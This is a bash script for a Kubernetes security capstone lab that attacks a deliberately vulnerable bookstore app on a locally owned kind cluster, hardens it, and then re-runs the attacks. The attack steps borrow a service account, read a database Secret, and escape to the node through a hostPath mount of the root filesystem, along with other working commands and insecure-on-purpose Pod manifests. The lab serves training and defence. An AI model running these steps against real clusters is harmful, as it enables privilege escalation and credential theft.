#!/usr/bin/env bash
# Lab 05.10: the capstone. Tier A (kind on a Linux host), on a kind cluster you own.
#
# The lab applies the vulnerable bookstore overlay to namespace p05-capstone,
# runs a kill chain against it, applies the hardened overlay, runs the same
# chain again, and runs kube-bench in p05-capstone-bench. The overlays live in
# examples/bookstore/security-lab/. Everything the lab creates is deleted at the
# end, including the cluster-scoped admission policy and the marker file.
#
# Run this ONLY against a kind cluster you own. It refuses any kubectl context
# that is not kind-*.
#
# A kind node is a container that shares the lab host's kernel. The payloads
# touch only the node container: they read /etc/kubernetes inside it, read its
# etcd snapshot file, and write one marker file, /tmp/p05-capstone-escape-marker.
# None of them reaches the lab host's files, another container or another
# cluster. No kernel exploit runs.
#
# The insecure manifests are the foothold (vulnerable phase), the borrowed Pod
# and the kube-bench Job. Each carries the marker. The hardened foothold is
# restricted-compliant and carries no marker, because a marker on a block that
# passes is a stale marker.
set +e

here=$(cd "$(dirname "$0")/.." && pwd)                 # examples/security-lab/
overlays=$(cd "$here/../bookstore/security-lab" && pwd) # examples/bookstore/security-lab/

ctx=$(kubectl config current-context 2>/dev/null)
case "$ctx" in
  kind-*) ;;
  *) echo "refusing to run: kubectl context '$ctx' is not a kind cluster" >&2; exit 2 ;;
esac

NODE=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [ -z "$NODE" ]; then echo "refusing to run: the cluster has no node" >&2; exit 2; fi

# A run that was killed never reaches its exit handler, so it leaves the
# cluster-scoped admission policy behind. That policy would refuse the
# vulnerable Pods in this run. Remove it first.
kubectl delete validatingadmissionpolicybinding p05-capstone-digest-pinned --ignore-not-found >/dev/null 2>&1
kubectl delete validatingadmissionpolicy p05-capstone-digest-pinned --ignore-not-found >/dev/null 2>&1

# A namespace left by an earlier run may still be deleting. Wait for it, so
# the apply below does not race a Terminating namespace.
for _ in $(seq 1 60); do kubectl get ns p05-capstone >/dev/null 2>&1 || break; sleep 10; done

work=$(mktemp -d) && cd "$work" || exit 1

# Print a command as it runs, then run it. The command is read from stdin.
run() { local cmd; cmd=$(cat); printf '$ %s\n' "$cmd"; eval "$cmd" 2>&1; echo; }

# Remove everything the lab adds, however the script ends.
cleanup() {
  kubectl delete ns p05-capstone p05-capstone-bench --ignore-not-found --wait=false >/dev/null 2>&1
  kubectl delete validatingadmissionpolicybinding p05-capstone-digest-pinned --ignore-not-found >/dev/null 2>&1
  kubectl delete validatingadmissionpolicy p05-capstone-digest-pinned --ignore-not-found >/dev/null 2>&1
  docker exec "$NODE" rm -f /tmp/p05-capstone-escape-marker >/dev/null 2>&1
}
trap cleanup EXIT

# The manifests the reader applies. The attack Pods run as the lab's own
# identities; the lab creates no other workload.

cat > foothold-vulnerable.yaml <<'YAML'
# INSECURE ON PURPOSE: a foothold that stands in for a compromised app. It runs as root with the catalog ServiceAccount token mounted, a writable root filesystem and a tag that can move. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: p05-capstone-foothold
  namespace: p05-capstone
  labels:
    app.kubernetes.io/part-of: bookstore
spec:
  serviceAccountName: catalog-sa
  automountServiceAccountToken: true
  securityContext:
    runAsUser: 0
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: curl
      image: curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: true
        readOnlyRootFilesystem: false
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          memory: 64Mi
  restartPolicy: Never
YAML

cat > borrow.yaml <<'YAML'
# INSECURE ON PURPOSE: a Pod that borrows payments-worker-sa, mounts the node's root through hostPath, runs as root with no seccomp filter, and keeps a writable root. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: p05-capstone-borrow
  namespace: p05-capstone
  labels:
    app.kubernetes.io/part-of: bookstore
spec:
  serviceAccountName: payments-worker-sa
  automountServiceAccountToken: true
  securityContext:
    runAsUser: 0
    seccompProfile:
      type: Unconfined
  containers:
    - name: curl
      image: curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: true
        readOnlyRootFilesystem: false
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          memory: 64Mi
      volumeMounts:
        - name: node-root
          mountPath: /host
  volumes:
    - name: node-root
      hostPath:
        path: /
        type: Directory
  restartPolicy: Never
YAML

cat > foothold-hardened.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: p05-capstone-foothold
  namespace: p05-capstone
  labels:
    app.kubernetes.io/part-of: bookstore
spec:
  serviceAccountName: catalog-sa
  automountServiceAccountToken: true
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    runAsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: curl
      image: curlimages/curl@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777  # curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          memory: 64Mi
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
  restartPolicy: Never
YAML

# Same Pod, with the tag instead of the digest. The namespace admits it under
# restricted, and the digest-pinning policy refuses it.
sed -e 's|image: curlimages/curl@sha256:[0-9a-f]*  # curlimages/curl:8.22.0|image: curlimages/curl:8.22.0|' -e 's/p05-capstone-foothold/p05-capstone-foothold-tag/' foothold-hardened.yaml > foothold-tag.yaml

cat > kube-bench.yaml <<'YAML'
# INSECURE ON PURPOSE: kube-bench reads the control plane's files and process table, so it needs hostPID and hostPath. It runs once. Lab cluster only.
apiVersion: v1
kind: Namespace
metadata:
  name: p05-capstone-bench
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/enforce-version: latest
---
apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench
  namespace: p05-capstone-bench
spec:
  backoffLimit: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/part-of: bookstore
    spec:
      restartPolicy: Never
      hostPID: true
      automountServiceAccountToken: false
      nodeSelector:
        node-role.kubernetes.io/control-plane: ""
      tolerations:
        - key: node-role.kubernetes.io/control-plane
          operator: Exists
          effect: NoSchedule
      containers:
        - name: kube-bench
          image: aquasec/kube-bench@sha256:75506f222d1eb6ce2a751a5533bdc0a3b54c898e2e49e7751d0ee22cfb862679  # aquasec/kube-bench:v0.16.0
          imagePullPolicy: IfNotPresent
          command: ["kube-bench", "run", "--targets", "master,etcd,node"]
          securityContext:
            allowPrivilegeEscalation: false
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              memory: 256Mi
          volumeMounts:
            - name: etc-kubernetes
              mountPath: /etc/kubernetes
              readOnly: true
            - name: var-lib-etcd
              mountPath: /var/lib/etcd
              readOnly: true
            - name: var-lib-kubelet
              mountPath: /var/lib/kubelet
              readOnly: true
            - name: etc-systemd
              mountPath: /etc/systemd
              readOnly: true
            - name: usr-bin
              mountPath: /usr/local/mount-from-host/bin
              readOnly: true
      volumes:
        - name: etc-kubernetes
          hostPath:
            path: /etc/kubernetes
        - name: var-lib-etcd
          hostPath:
            path: /var/lib/etcd
        - name: var-lib-kubelet
          hostPath:
            path: /var/lib/kubelet
        - name: etc-systemd
          hostPath:
            path: /etc/systemd
        - name: usr-bin
          hostPath:
            path: /usr/bin
YAML

echo '## step 1: the vulnerable bookstore, applied as one overlay'
run <<'CMD'
kubectl apply -k "$overlays/vulnerable"
CMD

run <<'CMD'
kubectl -n p05-capstone rollout status sts/postgres --timeout=600s
kubectl -n p05-capstone wait --for=condition=complete job/db-migrate --timeout=900s || { kubectl -n p05-capstone delete job db-migrate --wait=true; kubectl kustomize "$overlays/vulnerable" | kubectl apply -f - | grep -v " unchanged$"; kubectl -n p05-capstone wait --for=condition=complete job/db-migrate --timeout=900s; }
kubectl -n p05-capstone rollout status deploy/catalog --timeout=600s
kubectl get ns p05-capstone -L pod-security.kubernetes.io/enforce -L pod-security.kubernetes.io/warn
CMD

echo '## step 2: the foothold, a Pod the vulnerable namespace admits'
run <<'CMD'
kubectl apply -f foothold-vulnerable.yaml
kubectl -n p05-capstone wait --for=condition=Ready pod/p05-capstone-foothold --timeout=180s
CMD

echo '## step 3: recon from inside the foothold'
run <<'CMD'
kubectl -n p05-capstone exec p05-capstone-foothold -- sh -c '
  ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  echo "namespace: $ns"
  echo "token file: $(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token) bytes (contents not printed)"
  echo "Services in the namespace, from env: $(env | grep -c _SERVICE_HOST)"
  nslookup postgres.$ns.svc.cluster.local 2>&1 | grep -E "^Name|^Address" | tail -2
  can() { curl -s --max-time 20 --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"$ns\",\"verb\":\"$1\",\"resource\":\"$2\"}}}" | grep -o "\"allowed\": *[a-z]*"; }
  for pair in "create pods" "get secrets" "list secrets" "get configmaps"; do echo "$pair: $(can $pair)"; done'
CMD

echo '## step 4: borrow payments-worker-sa by creating a Pod that names it'
run <<'CMD'
kubectl create --dry-run=client -o json -f borrow.yaml > borrow.json
kubectl -n p05-capstone exec -i p05-capstone-foothold -- sh -c '
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  curl -s -o /dev/null -w "create the borrowing Pod: HTTP %{http_code}\n" --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST https://kubernetes.default.svc/api/v1/namespaces/p05-capstone/pods --data-binary @-' < borrow.json
kubectl -n p05-capstone wait --for=condition=Ready pod/p05-capstone-borrow --timeout=180s
kubectl -n p05-capstone get pod p05-capstone-borrow -o jsonpath='{.spec.serviceAccountName}{"\n"}'
CMD

echo '## step 5: the borrowed identity reads the database Secret'
run <<'CMD'
kubectl -n p05-capstone exec p05-capstone-borrow -- sh -c '
  NS=p05-capstone
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  S=$(curl -s --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets/db-credentials)
  echo "secret read as payments-worker-sa: $(echo "$S" | grep -c "\"POSTGRES_PASSWORD\"") key(s) found"
  echo "POSTGRES_PASSWORD decoded: $(echo "$S" | grep -o "\"POSTGRES_PASSWORD\": *\"[^\"]*\"" | cut -d\" -f4 | base64 -d | wc -c) bytes (value not printed)"'
CMD

echo '## step 6: escape to the node through hostPath'
run <<'CMD'
kubectl -n p05-capstone exec p05-capstone-borrow -- sh -c '
  echo "kernel seen in the Pod: $(uname -r)"
  echo "node hostname: $(cat /host/etc/hostname)"
  echo "kubelet and control-plane files: $(ls /host/etc/kubernetes | tr "\n" " ")"
  echo "admin.conf names: $(grep -E "name:" /host/etc/kubernetes/admin.conf | sed "s/^ *//" | tr "\n" " ")"
  touch /host/tmp/p05-capstone-escape-marker && echo "marker written in the node"'
docker exec "$NODE" ls -l /tmp/p05-capstone-escape-marker | awk '{print "marker in the node container:", $NF}'
CMD

echo '## step 7: the Secret at rest in the node'
run <<'CMD'
docker exec "$NODE" sh -c '
  echo "etcd snapshot: $(ls /var/lib/etcd/member/snap/ | tr "\n" " ")"
  echo "k8s:enc: prefix matches: $(grep -a -c "k8s:enc:" /var/lib/etcd/member/snap/db)"
  echo "plaintext password matches: $(grep -a -c devpassword /var/lib/etcd/member/snap/db)"'
CMD

echo '## step 8: reach postgres from the foothold, in a namespace with no NetworkPolicy'
run <<'CMD'
kubectl -n p05-capstone get networkpolicy 2>&1
kubectl -n p05-capstone exec p05-capstone-foothold -- sh -c 'curl -sS --connect-timeout 5 --max-time 8 -o /dev/null -w "postgres:5432 TCP connect time: %{time_connect}\n" telnet://postgres.p05-capstone.svc.cluster.local:5432 </dev/null; true'
CMD

echo '## step 9: which image ran, by digest'
run <<'CMD'
kubectl -n p05-capstone get pod p05-capstone-foothold -o jsonpath='{.spec.containers[0].image}{"\n"}{.status.containerStatuses[0].imageID}{"\n"}'
CMD

echo '## step 10: kube-bench, the control plane and the policies'
run <<'CMD'
ssh thinkpad "~/.local/bin/kind-v0.33.0 load docker-image aquasec/kube-bench:v0.16.0 --name sf-pilot" 2>&1 | tail -1
kubectl apply -f kube-bench.yaml
kubectl -n p05-capstone-bench wait --for=condition=complete job/kube-bench --timeout=420s
kubectl -n p05-capstone-bench logs job/kube-bench > bench.txt 2>&1
grep -E "^== Summary|checks (PASS|FAIL|WARN|INFO)" bench.txt
grep -c "\[FAIL\]" bench.txt
CMD

echo '## step 11: harden. Remove the vulnerable Pods and Roles, then apply the hardened overlay'
run <<'CMD'
kubectl -n p05-capstone delete pod p05-capstone-foothold p05-capstone-borrow --ignore-not-found --wait=true
kubectl -n p05-capstone delete role catalog-debugger payments-secret-reader --ignore-not-found
kubectl -n p05-capstone delete rolebinding catalog-debugger payments-secret-reader --ignore-not-found
kubectl apply -k "$overlays/hardened"
kubectl get ns p05-capstone -L pod-security.kubernetes.io/enforce -L pod-security.kubernetes.io/warn
kubectl get validatingadmissionpolicy,validatingadmissionpolicybinding p05-capstone-digest-pinned
CMD

echo '## step 12: re-attack. The insecure foothold is refused at admission'
run <<'CMD'
kubectl apply -f foothold-vulnerable.yaml
CMD

echo '## step 13: re-attack. The hardened foothold is admitted. Its identity is limited by RBAC, and its network by the policy'
run <<'CMD'
kubectl apply -f foothold-hardened.yaml
kubectl -n p05-capstone wait --for=condition=Ready pod/p05-capstone-foothold --timeout=180s
kubectl -n p05-capstone exec p05-capstone-foothold -- sh -c 'curl -sS --connect-timeout 5 --max-time 8 --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -o /dev/null -w "API from the foothold: HTTP %{http_code}, curl exit %{exitcode}\n" https://kubernetes.default.svc/api/v1/namespaces/p05-capstone/pods; true'
kubectl auth can-i create pods --as=system:serviceaccount:p05-capstone:catalog-sa -n p05-capstone
kubectl auth can-i get secrets --as=system:serviceaccount:p05-capstone:catalog-sa -n p05-capstone
kubectl auth can-i get configmaps --as=system:serviceaccount:p05-capstone:catalog-sa -n p05-capstone
kubectl apply -f borrow.yaml --dry-run=server --as=system:serviceaccount:p05-capstone:catalog-sa 2>&1 | cut -c1-200
CMD

echo '## step 14: re-attack. The tag-only image is refused by the digest policy'
run <<'CMD'
kubectl apply -f foothold-tag.yaml
CMD

echo '## step 15: re-attack. The network and the node, after hardening'
run <<'CMD'
kubectl -n p05-capstone get netpol default-deny-all -o jsonpath='{.spec.podSelector} {.spec.policyTypes}{"\n"}'
kubectl -n p05-capstone exec p05-capstone-foothold -- sh -c 'curl -sS --connect-timeout 5 --max-time 8 -o /dev/null -w "postgres:5432 TCP connect time: %{time_connect}\n" telnet://postgres.p05-capstone.svc.cluster.local:5432 </dev/null; true'
docker exec "$NODE" sh -c 'echo "plaintext password matches: $(grep -a -c devpassword /var/lib/etcd/member/snap/db)"'
CMD

echo '## step 16: clean up everything the lab created'
run <<'CMD'
kubectl delete ns p05-capstone p05-capstone-bench --ignore-not-found --wait=true
kubectl delete validatingadmissionpolicybinding p05-capstone-digest-pinned --ignore-not-found
kubectl delete validatingadmissionpolicy p05-capstone-digest-pinned --ignore-not-found
docker exec "$NODE" rm -f /tmp/p05-capstone-escape-marker
kubectl get ns | grep -c p05-capstone | awk '{print "p05-capstone namespaces left:", $1}'
CMD
